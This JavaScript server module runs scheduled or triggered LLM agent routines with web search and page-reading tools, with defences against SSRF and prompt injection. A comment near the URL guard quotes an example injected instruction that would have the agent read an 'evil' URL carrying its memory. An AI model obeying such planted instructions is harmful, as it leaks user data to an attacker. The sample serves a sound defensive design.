// Always-on routines: your own ADT Bot server runs routines you hand it, on their schedule or when a
// feed, a web page or a webhook fires, while your computers are off. The app sends each routine with
// its bot's instructions, skills and model; the provider key is stored encrypted on the server. Runs
// can use web search, read public web pages, the time, a calculator and the bot's skills: nothing on
// the server itself. Results wait for the app to collect them (and can ping your phone via ntfy).
//
// On when ADT_AGENT_TOKEN is set (24+ characters); the app needs that token. Data in ADT_DATA_DIR.
import { createCipheriv, createDecipheriv, createHash, randomBytes, timingSafeEqual } from "node:crypto";
import { existsSync, mkdirSync, readFileSync, renameSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { isLinkLocal, reachesPrivateNetwork } from "./proxy.mjs";

const JOB = /^\/api\/agent\/jobs\/([\w-]{1,64})(\/run)?$/;
const HOOK = /^\/api\/agent\/hook\/([\w-]{32,})$/;
const KINDS = new Set(["openai", "anthropic", "gemini"]);
const RESULTS_KEPT = 500;
const RUN_TIMEOUT_MS = 10 * 60_000;
const POLL_MS = 15 * 60_000;
const CORS = {
  "access-control-allow-origin": "*",
  "access-control-allow-methods": "GET, PUT, POST, DELETE, OPTIONS",
  "access-control-allow-headers": "authorization, content-type",
};

const text = (v, max) => (typeof v === "string" ? v.slice(0, max) : "");
const sameSecret = (a, b) => {
  const x = createHash("sha256").update(String(a)).digest();
  const y = createHash("sha256").update(String(b)).digest();
  return timingSafeEqual(x, y);
};

/** Reads a request body up to `max` bytes (rejects beyond). */
function readBody(req, max) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    let size = 0;
    req.on("data", (chunk) => {
      size += chunk.length;
      if (size > max) {
        reject(Object.assign(new Error("too large"), { status: 413 }));
        req.destroy();
        return;
      }
      chunks.push(chunk);
    });
    req.on("end", () => resolve(Buffer.concat(chunks).toString("utf8")));
    req.on("error", reject);
  });
}

/**
 * A public web page's text for a run: every redirect hop checked, so a page can't lead the server
 * into its own network or cloud metadata.
 */
export async function fetchPublic(url, { fetchImpl = fetch, signal, max = 2 * 1024 * 1024, allowPrivate = false } = {}) {
  let current = new URL(url);
  for (let hop = 0; hop <= 5; hop++) {
    if (!/^https?:$/.test(current.protocol)) throw new Error("only http(s) pages can be read");
    if (isLinkLocal(current.hostname) || (!allowPrivate && (await reachesPrivateNetwork(current.hostname)))) throw new Error(`${current.host} is on a private network`);
    const res = await fetchImpl(current, { redirect: "manual", signal: AbortSignal.any([signal ?? new AbortController().signal, AbortSignal.timeout(20_000)]), headers: { accept: "text/html,text/plain,application/xml,application/json;q=0.9,*/*;q=0.5" } });
    if (res.status >= 300 && res.status < 400 && res.headers.get("location")) {
      current = new URL(res.headers.get("location"), current);
      continue;
    }
    if (!res.ok) throw new Error(`${current.host} answered ${res.status}`);
    const reader = res.body?.getReader();
    const chunks = [];
    let size = 0;
    while (reader) {
      const { done, value } = await reader.read();
      if (done) break;
      size += value.length;
      if (size > max) {
        await reader.cancel().catch(() => undefined);
        break;
      }
      chunks.push(value);
    }
    return { text: Buffer.concat(chunks).toString("utf8"), type: res.headers.get("content-type") ?? "" };
  }
  throw new Error("too many redirects");
}

/**
 * @param {{ dir: string, token: string, secret?: Buffer, headless?: () => Promise<any>, notify?: (result: any) => Promise<void> | void, fetchImpl?: typeof fetch, now?: () => number, allowPrivate?: boolean }} options
 *   `allowPrivate` is for tests (a feed on localhost); a real server never reads its own network for a run.
 */
export function createAgentHost({ dir, token, secret, headless = () => import("./headless/agent.mjs"), notify, fetchImpl = fetch, now = Date.now, allowPrivate = false }) {
  if (!token || token.length < 24) throw new Error("ADT_AGENT_TOKEN must be at least 24 characters.");
  mkdirSync(dir, { recursive: true, mode: 0o700 });
  const keyFile = join(dir, "agent.key");
  const key = secret ?? (existsSync(keyFile) ? readFileSync(keyFile) : (() => {
    const k = randomBytes(32);
    writeFileSync(keyFile, k, { mode: 0o600 });
    return k;
  })());
  const load = (name, fallback) => {
    try {
      return JSON.parse(readFileSync(join(dir, name), "utf8"));
    } catch {
      return fallback;
    }
  };
  /** A full disk or a vanished folder is logged, not thrown: it mustn't take the server down. */
  const save = (name, value) => {
    try {
      const tmp = join(dir, `${name}.${process.pid}.tmp`);
      writeFileSync(tmp, JSON.stringify(value), { mode: 0o600 });
      renameSync(tmp, join(dir, name));
    } catch (error) {
      console.error(`Always-on routines: couldn't save ${name}:`, error?.code ?? error);
    }
  };
  /** @type {any[]} */
  let jobs = load("jobs.json", []);
  /** @type {any[]} */
  let results = load("results.json", []);
  const running = new Map();
  const hookCalls = new Map();

  const seal = (plain) => {
    if (!plain) return "";
    const iv = randomBytes(12);
    const cipher = createCipheriv("aes-256-gcm", key, iv);
    const data = Buffer.concat([cipher.update(plain, "utf8"), cipher.final()]);
    return `${iv.toString("base64")}.${cipher.getAuthTag().toString("base64")}.${data.toString("base64")}`;
  };
  const open = (sealed) => {
    if (!sealed) return "";
    const [iv, tag, data] = sealed.split(".");
    const decipher = createDecipheriv("aes-256-gcm", key, Buffer.from(iv, "base64"));
    decipher.setAuthTag(Buffer.from(tag, "base64"));
    return Buffer.concat([decipher.update(Buffer.from(data, "base64")), decipher.final()]).toString("utf8");
  };

  const publicJob = (j) => ({
    id: j.id,
    name: j.name,
    enabled: j.enabled,
    schedule: j.schedule,
    trigger: j.trigger,
    hookToken: j.hookToken,
    model: j.provider.model,
    nextRun: j.nextRun,
    lastRun: j.lastRun,
    status: running.has(j.id) ? "running" : (j.history?.[0]?.status ?? "new"),
    disabledReason: j.disabledReason,
    updatedAt: j.updatedAt,
  });

  async function validate(id, body, existing) {
    const h = await headless();
    const provider = body.provider ?? {};
    if (!KINDS.has(provider.kind)) throw new Error("Unsupported provider for server runs.");
    if (!/^https?:\/\//.test(provider.baseUrl ?? "") && provider.kind !== "anthropic" && provider.kind !== "gemini") throw new Error("The provider needs an address.");
    if (!text(provider.model, 200)) throw new Error("Pick a model.");
    const schedule = body.trigger ? undefined : body.schedule;
    if (schedule) {
      const problem = h.validateSchedule(schedule);
      if (problem) throw new Error(problem);
    }
    const trigger = body.trigger ? { type: text(body.trigger.type, 20), ...(body.trigger.url ? { url: text(body.trigger.url, 2000) } : {}) } : undefined;
    if (trigger && !["feed", "page", "webhook"].includes(trigger.type)) throw new Error("On the server a routine can run on a schedule, a feed, a page change or a webhook.");
    if (trigger && trigger.type !== "webhook" && !/^https?:\/\//.test(trigger.url ?? "")) throw new Error("The trigger needs a web address.");
    if (!schedule && !trigger) throw new Error("Give the routine a schedule or a trigger.");
    const name = text(body.name, 80).trim();
    const instruction = text(body.instruction, 8000).trim();
    if (!name || !instruction) throw new Error("The routine needs a name and an instruction.");
    const at = now();
    const sameTrigger = JSON.stringify(trigger ?? null) === JSON.stringify(existing?.trigger ?? null);
    // A stored key only ever goes back to where it was stored for.
    const sameProvider = existing && existing.provider.kind === provider.kind && existing.provider.baseUrl === text(provider.baseUrl, 500);
    const sameSearch = existing && existing.search?.engine === body.search?.engine && existing.search?.url === text(body.search?.url, 500);
    return {
      id,
      name,
      instruction,
      enabled: body.enabled !== false,
      system: text(body.system, 60_000),
      provider: {
        kind: provider.kind,
        presetId: text(provider.presetId, 60),
        name: text(provider.name, 80),
        baseUrl: text(provider.baseUrl, 500),
        model: text(provider.model, 200),
        headers: Object.fromEntries(Object.entries(provider.headers ?? {}).filter(([k, v]) => typeof v === "string" && /^[\w-]{1,64}$/.test(k)).slice(0, 20)),
        // A new key replaces the stored one; none keeps it.
        apiKey: provider.apiKey ? seal(text(provider.apiKey, 1000)) : sameProvider ? existing.provider.apiKey : "",
      },
      search: { engine: ["duckduckgo", "brave", "tavily", "searxng"].includes(body.search?.engine) ? body.search.engine : "duckduckgo", url: text(body.search?.url, 500), apiKey: body.search?.apiKey ? seal(text(body.search.apiKey, 500)) : sameSearch ? (existing.search?.apiKey ?? "") : "" },
      skills: (Array.isArray(body.skills) ? body.skills : []).slice(0, 50).map((s) => ({ name: text(s?.name, 60), description: text(s?.description, 500), instructions: text(s?.instructions, 20_000) })).filter((s) => s.name && s.instructions),
      schedule,
      trigger,
      triggerState: sameTrigger ? existing?.triggerState : undefined,
      hookToken: trigger?.type === "webhook" ? (existing?.hookToken ?? randomBytes(24).toString("base64url")) : undefined,
      nextRun: schedule ? h.nextRunAfter(schedule.type === "interval" ? { ...schedule, anchor: at } : schedule, at) : null,
      lastRun: existing?.lastRun,
      history: existing?.history ?? [],
      failures: 0,
      createdAt: existing?.createdAt ?? at,
      updatedAt: at,
    };
  }

  /**
   * Once a run has taken in outside content (search results, a page, what set it off), it may only
   * open addresses that content or its instruction showed it: an injected "read https://evil/?d=<your
   * memory>" can't carry anything out.
   */
  const URLS = /https?:\/\/[^\s<>"'`)\]]+/g;
  const urlsIn = (value) => [...String(value).matchAll(URLS)].map((m) => m[0].replace(/[.,;:!?]+$/, ""));

  function toolsFor(job, h, guard) {
    const search = { engine: job.search.engine, url: job.search.url, apiKey: open(job.search.apiKey), readPages: false, native: false };
    const seen = (content) => {
      guard.outside = true;
      for (const u of urlsIn(content)) guard.known.add(u);
      return content;
    };
    const tools = [
      {
        name: "web_search",
        description: "Search the web; returns titles, links and snippets.",
        parameters: { type: "object", properties: { query: { type: "string" } }, required: ["query"] },
        run: async (args, signal) => {
          const results = await h.searchWeb(String(args.query ?? ""), search, signal);
          return { content: seen(results.map((r, i) => `[${i + 1}] ${r.title}\n${r.url}\n${r.snippet}`).join("\n\n") || "No results."), untrusted: "web search results" };
        },
      },
      {
        name: "read_url",
        description: "Read a public web page (not this server's network).",
        parameters: { type: "object", properties: { url: { type: "string" } }, required: ["url"] },
        run: async (args, signal) => {
          const url = String(args.url ?? "").trim();
          if (guard.outside && !guard.known.has(url)) {
            throw new Error("After reading outside content, a run only opens addresses it was shown (in its instruction, search results or pages). Use one of those.");
          }
          const page = await fetchPublic(url, { fetchImpl, signal });
          const body = /html/.test(page.type) || /^\s*</.test(page.text) ? h.extractText(page.text) : page.text;
          // Links on the page count as shown.
          for (const u of urlsIn(page.text.slice(0, 500_000))) guard.known.add(u);
          return { content: seen(body.slice(0, 40_000)), untrusted: url };
        },
      },
      {
        name: "current_time",
        description: "The current date and time, optionally in an IANA time zone.",
        parameters: { type: "object", properties: { timezone: { type: "string" } } },
        run: async (args) => new Date(now()).toLocaleString("en-US", { timeZone: args.timezone ? String(args.timezone) : undefined, dateStyle: "full", timeStyle: "long" }),
      },
      {
        name: "calculate",
        description: "Evaluate an arithmetic expression exactly.",
        parameters: { type: "object", properties: { expression: { type: "string" } }, required: ["expression"] },
        run: async (args) => String(h.calculate(String(args.expression ?? ""))),
      },
      {
        name: "routine_no_update",
        description: "Call when this run found nothing worth telling the user.",
        parameters: { type: "object", properties: { reason: { type: "string" } } },
        run: async () => "Noted: the user won't be notified.",
      },
    ];
    if (job.skills.length) {
      tools.push({
        name: "use_skill",
        description: `Get the steps of one of your skills: ${job.skills.map((s) => s.name).join(", ")}.`,
        parameters: { type: "object", properties: { name: { type: "string" } }, required: ["name"] },
        run: async (args) => {
          const skill = job.skills.find((s) => s.name === String(args.name ?? "").replace(/^\//, ""));
          return skill ? `Skill "${skill.name}" (${skill.description}):\n\n${skill.instructions}` : `No skill called ${args.name}.`;
        },
      });
    }
    return tools;
  }

  async function run(job, trigger, events = []) {
    if (running.has(job.id)) return null;
    const controller = new AbortController();
    running.set(job.id, controller);
    const started = now();
    const timer = setTimeout(() => controller.abort(), RUN_TIMEOUT_MS);
    let result;
    try {
      const h = await headless();
      // What set the run off is outside content already; the instruction's own addresses are fine to open.
      const guard = { outside: events.length > 0, known: new Set([...urlsIn(job.instruction), ...events.flatMap((e) => urlsIn(`${e.title}\n${e.details}`))]) };
      const out = await h.runAgent({
        provider: { id: `server-${job.id}`, presetId: job.provider.presetId, name: job.provider.name, kind: job.provider.kind, baseUrl: job.provider.baseUrl, apiKey: open(job.provider.apiKey), models: [], headers: job.provider.headers },
        model: job.provider.model,
        system: `${job.system}\n\nCurrent date and time: ${new Date(started).toString()}.\nYou are running on the user's always-on server, with nobody there to answer questions or approve actions. Do what the instruction says with the tools you have; say plainly what you couldn't do.`,
        prompt: h.firing(job.instruction, events),
        tools: toolsFor(job, h, guard),
        maxSteps: 8,
        signal: controller.signal,
      });
      result = { status: out.quiet ? "quiet" : "ok", text: out.text.trim() || "(no answer)", tools: out.tools };
    } catch (error) {
      result = { status: "error", text: controller.signal.aborted ? `Stopped after ${RUN_TIMEOUT_MS / 60_000} minutes.` : String(error?.message ?? error).slice(0, 500) };
    } finally {
      clearTimeout(timer);
      running.delete(job.id);
    }
    const entry = { id: randomBytes(8).toString("hex"), jobId: job.id, name: job.name, at: started, finishedAt: now(), trigger, events: events.length, ...result };
    results = [...results, entry].slice(-RESULTS_KEPT);
    const current = jobs.find((j) => j.id === job.id);
    if (current) {
      current.lastRun = started;
      current.history = [{ at: started, status: entry.status }, ...(current.history ?? [])].slice(0, 20);
      current.failures = entry.status === "error" ? (current.failures ?? 0) + 1 : 0;
      if (current.failures >= 10) {
        current.enabled = false;
        current.disabledReason = "Switched off after 10 failed runs in a row.";
      }
    }
    save("jobs.json", jobs);
    save("results.json", results);
    if (entry.status !== "quiet") await Promise.resolve(notify?.(entry)).catch(() => undefined);
    return entry;
  }

  async function checkTrigger(job, h) {
    const t = job.trigger;
    const state = job.triggerState ?? {};
    if (t.type === "feed") {
      const page = await fetchPublic(t.url, { fetchImpl, allowPrivate });
      const items = h.parseFeed(page.text);
      if (!items.length) throw new Error("That address isn't an RSS or Atom feed.");
      if (!state.seen) return { state: { seen: items.map((i) => i.id).slice(0, 300) }, events: [] };
      const seen = new Set(state.seen);
      const fresh = items.filter((i) => !seen.has(i.id)).slice(0, 10);
      return {
        state: { seen: [...fresh.map((i) => i.id), ...state.seen].slice(0, 300) },
        events: fresh.reverse().map((i) => ({ title: i.title || "New item", details: `${i.link}${i.date ? ` (${i.date})` : ""}\n${i.summary.slice(0, 600)}`, source: `the feed ${new URL(t.url).host}` })),
      };
    }
    const page = await fetchPublic(t.url, { fetchImpl, allowPrivate });
    const body = /html/.test(page.type) || /^\s*</.test(page.text) ? h.extractText(page.text) : page.text;
    const hash = await h.fingerprint(body);
    if (!state.hash || hash === state.hash) return { state: { hash, text: body.slice(0, 20_000) }, events: [] };
    const changed = h.pageChange(state.text ?? "", body);
    return { state: { hash, text: body.slice(0, 20_000) }, events: changed ? [{ title: `${new URL(t.url).host} changed`, details: `${t.url}\nNew on the page:\n${changed}`, source: `the page ${new URL(t.url).host}` }] : [] };
  }

  let ticking = false;
  async function tick() {
    if (ticking) return;
    ticking = true;
    try {
      const h = await headless();
      const at = now();
      for (const job of jobs) {
        if (!job.enabled || running.has(job.id)) continue;
        if (job.schedule && job.nextRun && job.nextRun <= at) {
          job.nextRun = h.nextRunAfter(job.schedule, at);
          save("jobs.json", jobs);
          run(job, "schedule").catch((e) => console.error("Always-on run failed:", e));
        } else if (job.trigger && job.trigger.type !== "webhook" && at - (job.triggerState?.checkedAt ?? 0) >= POLL_MS) {
          try {
            const { state, events } = await checkTrigger(job, h);
            job.triggerState = { ...state, checkedAt: at };
            save("jobs.json", jobs);
            if (events.length) run(job, "event", events).catch((e) => console.error("Always-on run failed:", e));
          } catch (error) {
            job.triggerState = { ...job.triggerState, checkedAt: at, error: String(error?.message ?? error).slice(0, 200) };
            save("jobs.json", jobs);
          }
        }
      }
    } finally {
      ticking = false;
    }
  }

  const reply = (res, status, body) => {
    res.writeHead(status, { ...CORS, "cache-control": "no-store", ...(body === undefined ? {} : { "content-type": "application/json" }) });
    res.end(body === undefined ? undefined : JSON.stringify(body));
  };

  let timer = null;
  return {
    start(intervalMs = 30_000) {
      const safeTick = () => tick().catch((e) => console.error("Always-on routines:", e));
      timer ??= setInterval(safeTick, intervalMs);
      void safeTick();
    },
    stop() {
      clearInterval(timer);
      timer = null;
      for (const c of running.values()) c.abort();
    },
    tick,
    jobs: () => jobs.map(publicJob),
    results: () => results,
    async handle(req, res, next) {
      const path = (req.url ?? "").split("?")[0];
      if (!path.startsWith("/api/agent")) return next();
      if (req.method === "OPTIONS") return reply(res, 204);
      try {
        // Webhooks: the secret is in the address (no app token).
        const hook = HOOK.exec(path);
        if (hook) {
          if (req.method !== "POST") return reply(res, 405, { error: "Use POST." });
          const job = jobs.find((j) => j.enabled && j.trigger?.type === "webhook" && j.hookToken && sameSecret(j.hookToken, hook[1]));
          if (!job) return reply(res, 404, { error: "Not found." });
          const recent = (hookCalls.get(job.id) ?? []).filter((t) => now() - t < 60_000);
          if (recent.length >= 30) return reply(res, 429, { error: "Too many calls." });
          hookCalls.set(job.id, [...recent, now()]);
          const body = await readBody(req, 64 * 1024);
          run(job, "event", [{ title: "The webhook was called", details: `Content-Type: ${String(req.headers["content-type"] ?? "?").slice(0, 100)}\n\n${body}`, source: "a webhook call" }]).catch((e) => console.error("Always-on run failed:", e));
          return reply(res, 202, { ok: true });
        }
        const auth = String(req.headers.authorization ?? "").replace(/^Bearer\s+/i, "");
        if (!auth || !sameSecret(auth, token)) return reply(res, 401, { error: "Wrong or missing server token." });
        if (path === "/api/agent" && req.method === "GET") return reply(res, 200, { ok: true, time: now(), jobs: jobs.map(publicJob) });
        if (path === "/api/agent/results" && req.method === "GET") {
          const since = Number(new URL(req.url, "http://x").searchParams.get("since")) || 0;
          return reply(res, 200, { results: results.filter((r) => r.finishedAt > since) });
        }
        const match = JOB.exec(path);
        if (!match) return reply(res, 404, { error: "Not found." });
        const id = match[1];
        const existing = jobs.find((j) => j.id === id);
        if (match[2]) {
          if (req.method !== "POST") return reply(res, 405, { error: "Use POST." });
          if (!existing) return reply(res, 404, { error: "No such routine on the server." });
          run(existing, "manual").catch((e) => console.error("Always-on run failed:", e));
          return reply(res, 202, { ok: true });
        }
        if (req.method === "DELETE") {
          running.get(id)?.abort();
          jobs = jobs.filter((j) => j.id !== id);
          save("jobs.json", jobs);
          return reply(res, 204);
        }
        if (req.method !== "PUT") return reply(res, 405, { error: "Use GET, PUT, POST or DELETE." });
        if (!existing && jobs.length >= 100) return reply(res, 507, { error: "This server already has 100 routines." });
        const job = await validate(id, JSON.parse((await readBody(req, 1024 * 1024)) || "{}"), existing);
        jobs = existing ? jobs.map((j) => (j.id === id ? job : j)) : [...jobs, job];
        save("jobs.json", jobs);
        return reply(res, 200, { job: publicJob(job) });
      } catch (error) {
        return reply(res, error?.status ?? 400, { error: String(error?.message ?? error) });
      }
    },
  };
}

/** Pings a phone through ntfy (ADT_NTFY_URL, e.g. https://ntfy.sh/your-secret-topic) when a run has news. */
export function ntfyNotifier(url, fetchImpl = fetch) {
  if (!url) return undefined;
  return async (result) => {
    await fetchImpl(url, {
      method: "POST",
      headers: { title: `${result.status === "error" ? "Routine failed: " : ""}${result.name}`.slice(0, 200), tags: result.status === "error" ? "warning" : "robot" },
      body: result.text.slice(0, 1000),
    });
  };
}
